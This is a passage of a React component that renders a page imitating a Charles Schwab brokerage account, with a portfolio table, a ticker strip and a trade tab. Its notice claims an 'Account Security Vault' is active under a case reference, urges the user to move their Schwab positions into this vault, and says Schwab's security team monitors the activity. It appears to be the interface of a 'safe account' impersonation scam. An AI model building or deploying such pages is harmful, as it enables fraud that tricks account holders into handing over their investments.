          <div style={{ display: 'grid', gridTemplateColumns: GRID, borderBottom: '1px solid #D7D9DA' }}>
            {[
              '', '',
              '', '',
              '',
              hasData ? fmtVal(matched!.marketValue) : '$0.00',
              '',
              hasData ? fmtVal(matched!.costBasis) : '$0.00',
              '',
              '',
              hasData ? '99.39%' : '—',
              '',
            ].map((v, ci) => (
              <div key={ci} style={{
                padding: rowPad, fontSize: 13, fontWeight: 700,
                color: v.startsWith('-') ? '#9A4050' : '#333',
                textAlign: ci >= 2 ? 'right' : 'left',
                borderLeft: ci > 0 ? '1px solid #ECEDEE' : 'none',
              }}>{v}</div>
            ))}
          </div>

          {/* Cash row */}
          <div style={{ display: 'grid', gridTemplateColumns: GRID, padding: '0' }}>
            {[
              '', 'Cash & Cash Investments',
              '', '', '',
              hasData ? fmtVal(matched!.cashValue) : '$45.06',
              '', '', '', '', '0.61%', '',
            ].map((v, ci) => (
              <div key={ci} style={{
                padding: rowPad, fontSize: 12,
                color: ci === 1 ? '#555' : ci === 5 ? '#555' : '#888',
                textAlign: ci >= 2 ? 'right' : 'left',
                borderLeft: ci > 0 ? '1px solid #ECEDEE' : 'none',
              }}>{v}</div>
            ))}
          </div>
        </div>

        {/* Notice */}
        <div style={{
          ...PANEL,
          margin: '10px 20px 0',
          padding: '12px 16px',
          display: 'flex', alignItems: 'flex-start', gap: 12,
        }}>
          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" style={{ flexShrink: 0, marginTop: 1 }}>
            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" stroke="#344B58" strokeWidth="1.75" strokeLinecap="round" strokeLinejoin="round" />
            <path d="M12 8v4m0 4h.01" stroke="#344B58" strokeWidth="1.75" strokeLinecap="round" />
          </svg>
          <div>
            <div style={{ fontSize: 13, fontWeight: 700, color: '#333', marginBottom: 3 }}>
              Vault Account Active — Welcome, {name}
            </div>
            <div style={{ fontSize: 12, color: '#666', lineHeight: 1.65 }}>
              Your Account Security Vault is active under case reference{' '}
              <span style={{ fontFamily: 'monospace', fontWeight: 700, color: '#333' }}>{vaultRef}</span>.{' '}
              {migrationDone
                ? 'Asset migration is complete. All positions have been transferred.'
                : 'Use the migration tool above to transfer your Charles Schwab positions into this vault.'}{' '}
              All activity is monitored by the Charles Schwab security operations team.
            </div>
          </div>
        </div>

      </div>

      {/* ── Market/Quote ticker strip ───────────────────────────────────────── */}
      <div style={{
        position: 'fixed', bottom: 0, left: 0, right: 0,
        height: 34,
        background: '#F4F5F5',
        borderTop: '3px solid #00889B',
        display: 'flex', alignItems: 'center',
        fontFamily: 'Arial, "Helvetica Neue", Helvetica, sans-serif',
        zIndex: 40, overflow: 'hidden',
      }}>
        {/* Symbol lookup */}
        <div style={{ display: 'flex', alignItems: 'center', borderRight: '1px solid #D2D5D6', padding: '0 8px', flexShrink: 0, gap: 0 }}>
          <input type="text" placeholder="Symbol Lookup"
            style={{ width: 96, height: 20, background: '#fff', border: '1px solid #B8BCBD', padding: '0 6px', fontSize: 10.5, outline: 'none', color: '#111' }} />
          <button style={{ height: 20, padding: '0 8px', background: '#00889B', border: 'none', color: '#fff', fontSize: 10.5, fontWeight: 700, cursor: 'pointer', marginLeft: 1 }}>Quote</button>
        </div>

        {/* Show indices */}
        <div style={{ padding: '0 10px', borderRight: '1px solid #D2D5D6', flexShrink: 0, display: 'flex', alignItems: 'center', gap: 5 }}>
          <input type="checkbox" defaultChecked style={{ accentColor: '#00889B', width: 11, height: 11 }} />
          <span style={{ fontSize: 10.5, color: '#555' }}>Show Indices</span>
        </div>

        {/* Tickers */}
        <div style={{ display: 'flex', alignItems: 'center', flex: 1, padding: '0 2px' }}>
          {TICKERS.map((tk, i) => (
            <div key={tk.name} style={{
              display: 'flex', alignItems: 'baseline', gap: 5,
              padding: '0 14px',
              borderRight: i < TICKERS.length - 1 ? '1px solid #D2D5D6' : 'none',
            }}>
              <span style={{ fontSize: 11, fontWeight: 700, color: '#333' }}>{tk.name}</span>
              <span style={{ fontSize: 11, color: '#333' }}>
                {tk.value.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
              </span>
              <span style={{ fontSize: 10.5, color: tk.change >= 0 ? '#4D805D' : '#9A4050', fontWeight: 400 }}>
                {tk.change >= 0 ? '+' : ''}{tk.change.toFixed(2)} ({tk.pct >= 0 ? '+' : ''}{tk.pct.toFixed(2)}%)
              </span>
            </div>
          ))}
        </div>

        {/* Time + Refresh */}
        <div style={{ padding: '0 12px', borderLeft: '1px solid #D2D5D6', flexShrink: 0, display: 'flex', alignItems: 'center', gap: 8 }}>
          <span style={{ fontSize: 10.5, color: '#666' }}>Time (ET)</span>
          <span style={{ fontSize: 11, color: '#333', fontVariantNumeric: 'tabular-nums' }}>{clock}</span>
          <button style={{ background: 'none', border: 'none', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: 3, padding: 0 }}>
            <svg width="10" height="10" viewBox="0 0 24 24" fill="none">
              <polyline points="23 4 23 10 17 10" stroke="#555" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round" />
              <path d="M20.49 15a9 9 0 11-2.12-9.36L23 10" stroke="#555" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round" />
            </svg>
            <span style={{ fontSize: 10.5, color: '#555' }}>Refresh</span>
          </button>
        </div>
      </div>

      {/* ── SnapTicket® vertical tab ────────────────────────────────────────── */}
      <div style={{
        position: 'fixed', right: 0, top: '50%', transform: 'translateY(-50%)',
        width: 36, background: '#fff',
        border: '1px solid #D2D5D6', borderRight: 'none',
        boxShadow: '-2px 0 6px rgba(0,0,0,0.08)',
        display: 'flex', flexDirection: 'column', alignItems: 'center',
        zIndex: 35,
      }}>
        {/* Trade button */}
        <div style={{
          width: '100%', height: 30, background: '#00889B',
          display: 'flex', alignItems: 'center', justifyContent: 'center', cursor: 'pointer',
        }}>
          <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
            <path d="M8 2v12M4 6l4-4 4 4M4 10l4 4 4-4" stroke="#fff" strokeWidth="1.4" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
        </div>
        {/* Label */}
        <div style={{
          writingMode: 'vertical-rl', textOrientation: 'mixed',
          transform: 'rotate(180deg)',
          fontSize: 11, fontWeight: 400, color: '#555',
          padding: '10px 0', letterSpacing: '0.04em', userSelect: 'none',
        }}>
          SnapTicket®
        </div>
      </div>

    </div>
  );
}
